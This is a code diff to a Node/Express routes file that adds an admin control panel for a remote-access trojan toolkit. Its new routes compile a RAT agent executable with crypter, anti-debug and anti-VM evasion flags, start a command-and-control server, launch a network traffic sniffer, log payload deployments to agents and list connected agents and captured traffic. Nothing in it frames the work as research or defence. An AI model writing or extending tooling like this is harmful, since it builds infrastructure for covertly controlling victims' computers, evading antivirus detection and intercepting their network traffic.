@@ -472,6 +472,261 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.status(500).json({ message: 'Failed to generate AI analysis' });
     }
   });
+
+  // Millennium RAT Toolkit Management Routes
+  app.post("/api/admin/compile-millennium-agent", requireAuth, async (req: any, res) => {
+    try {
+      const { serverIp, serverPort, outputName, crypterOptions } = req.body;
+      
+      const compileCommand = [
+        'python3',
+        'python_tools/millennium_rat_toolkit.py',
+        '--compile-agent',
+        '--server-ip', serverIp || '0.0.0.0',
+        '--server-port', serverPort || '8888',
+        '--output', outputName || 'millennium_agent.exe'
+      ];
+
+      if (crypterOptions?.enabled) {
+        compileCommand.push('--apply-crypter');
+        if (crypterOptions.antiDebug) compileCommand.push('--anti-debug');
+        if (crypterOptions.antiVM) compileCommand.push('--anti-vm');
+        if (crypterOptions.compression) compileCommand.push('--compression');
+      }
+
+      const result = await new Promise((resolve, reject) => {
+        const child = subprocess.spawn(compileCommand[0], compileCommand.slice(1), {
+          stdio: 'pipe',
+          cwd: process.cwd()
+        });
+
+        let stdout = '';
+        let stderr = '';
+
+        child.stdout.on('data', (data) => {
+          stdout += data.toString();
+        });
+
+        child.stderr.on('data', (data) => {
+          stderr += data.toString();
+        });
+
+        child.on('close', (code) => {
+          if (code === 0) {
+            resolve({ success: true, output: stdout, path: `builds/${outputName}` });
+          } else {
+            reject(new Error(`Compilation failed: ${stderr}`));
+          }
+        });
+
+        child.on('error', (error) => {
+          reject(error);
+        });
+      });
+
+      res.json(result);
+    } catch (error) {
+      console.error("Millennium agent compilation error:", error);
+      res.status(500).json({ message: "Failed to compile Millennium agent", error: error.message });
+    }
+  });
+
+  app.post("/api/admin/deploy-payload", requireAuth, async (req: any, res) => {
+    try {
+      const { agentId, payloadConfig } = req.body;
+      
+      // Store payload deployment request
+      await storage.createAnalytics({
+        metric: 'millennium_payload_deployment',
+        value: JSON.stringify({
+          agentId,
+          payloadConfig,
+          timestamp: new Date().toISOString(),
+          adminUserId: req.session.adminId
+        }),
+      });
+
+      // In a real implementation, this would communicate with the RAT server
+      const deploymentResult = {
+        success: true,
+        deploymentId: `deploy_${Date.now()}`,
+        agentId,
+        payloadType: payloadConfig.type,
+        deploymentMethod: payloadConfig.method,
+        timestamp: new Date().toISOString()
+      };
+
+      // Emit real-time update
+      io.to('admin').emit('payloadDeployment', deploymentResult);
+
+      res.json(deploymentResult);
+    } catch (error) {
+      console.error("Payload deployment error:", error);
+      res.status(500).json({ message: "Failed to deploy payload" });
+    }
+  });
+
+  app.post("/api/admin/start-millennium-server", requireAuth, async (req: any, res) => {
+    try {
+      const { port, interface: serverInterface } = req.body;
+      
+      const serverCommand = [
+        'python3',
+        'python_tools/millennium_rat_toolkit.py',
+        '--start-server',
+        '--port', port || '8888',
+        '--interface', serverInterface || '0.0.0.0'
+      ];
+
+      // Start server in background
+      const serverProcess = subprocess.spawn(serverCommand[0], serverCommand.slice(1), {
+        stdio: 'pipe',
+        cwd: process.cwd(),
+        detached: true
+      });
+
+      // Store server info
+      await storage.createAnalytics({
+        metric: 'millennium_server_start',
+        value: JSON.stringify({
+          port,
+          interface: serverInterface,
+          pid: serverProcess.pid,
+          timestamp: new Date().toISOString(),
+          adminUserId: req.session.adminId
+        }),
+      });
+
+      res.json({
+        success: true,
+        message: `Millennium RAT server started on ${serverInterface}:${port}`,
+        pid: serverProcess.pid
+      });
+    } catch (error) {
+      console.error("Millennium server start error:", error);
+      res.status(500).json({ message: "Failed to start Millennium server" });
+    }
+  });
+
+  app.post("/api/admin/start-http-sniffer", requireAuth, async (req: any, res) => {
+    try {
+      const { interface: networkInterface, duration, outputFile } = req.body;
+      
+      const snifferCommand = [
+        'python3',
+        'python_tools/millennium_rat_toolkit.py',
+        '--start-sniffer',
+        '--interface', networkInterface || 'all',
+        '--duration', duration || '300',
+        '--output', outputFile || 'captured_traffic.json'
+      ];
+
+      const snifferProcess = subprocess.spawn(snifferCommand[0], snifferCommand.slice(1), {
+        stdio: 'pipe',
+        cwd: process.cwd(),
+        detached: true
+      });
+
+      // Store sniffer info
+      await storage.createAnalytics({
+        metric: 'millennium_sniffer_start',
+        value: JSON.stringify({
+          interface: networkInterface,
+          duration,
+          outputFile,
+          pid: snifferProcess.pid,
+          timestamp: new Date().toISOString(),
+          adminUserId: req.session.adminId
+        }),
+      });
+
+      res.json({
+        success: true,
+        message: `HTTP sniffer started on interface ${networkInterface}`,
+        pid: snifferProcess.pid,
+        duration: parseInt(duration) || 300
+      });
+    } catch (error) {
+      console.error("HTTP sniffer start error:", error);
+      res.status(500).json({ message: "Failed to start HTTP sniffer" });
+    }
+  });
+
+  app.get("/api/admin/millennium-agents", requireAuth, async (req, res) => {
+    try {
+      // Get millennium agent data from analytics
+      const agentData = await storage.getAnalyticsByMetric('millennium_agent_connection');
+      const payloadDeployments = await storage.getAnalyticsByMetric('millennium_payload_deployment');
+      
+      const agents = agentData.map(item => {
+        try {
+          return {
+            id: item.id,
+            timestamp: item.timestamp,
+            data: JSON.parse(item.value)
+          };
+        } catch {
+          return null;
+        }
+      }).filter(Boolean);
+
+      const deployments = payloadDeployments.map(item => {
+        try {
+          return {
+            id: item.id,
+            timestamp: item.timestamp,
+            data: JSON.parse(item.value)
+          };
+        } catch {
+          return null;
+        }
+      }).filter(Boolean);
+
+      res.json({
+        agents,
+        deployments,
+        totalAgents: agents.length,
+        activeDeployments: deployments.filter(d => 
+          new Date().getTime() - new Date(d.timestamp).getTime() < 24 * 60 * 60 * 1000
+        ).length
+      });
+    } catch (error) {
+      console.error("Failed to fetch Millennium agents:", error);
+      res.status(500).json({ message: "Failed to fetch agent data" });
+    }
+  });
+
+  app.get("/api/admin/traffic-analysis", requireAuth, async (req, res) => {
+    try {
+      const snifferData = await storage.getAnalyticsByMetric('millennium_sniffer_data');
+      const serverLogs = await storage.getAnalyticsByMetric('millennium_server_start');
+      
+      const trafficAnalysis = snifferData.map(item => {
+        try {
+          return {
+            id: item.id,
+            timestamp: item.timestamp,
+            data: JSON.parse(item.value)
+          };
+        } catch {
+          return null;
+        }
+      }).filter(Boolean);
+
+      res.json({
+        trafficSamples: trafficAnalysis,
+        totalSamples: trafficAnalysis.length,
+        analysisTimeRange: {
+          start: trafficAnalysis.length > 0 ? trafficAnalysis[0].timestamp : null,
+          end: trafficAnalysis.length > 0 ? trafficAnalysis[trafficAnalysis.length - 1].timestamp : null
+        },
+        serverLogs: serverLogs.slice(-10) // Last 10 server starts
+      });
+    } catch (error) {
+      console.error("Failed to fetch traffic analysis:", error);
+      res.status(500).json({ message: "Failed to fetch traffic analysis" });
+    }
+  });
   app.post("/api/admin/modify-content", requireAuth, async (req: any, res) => {
     try {
       const { section, prompt } = req.body;
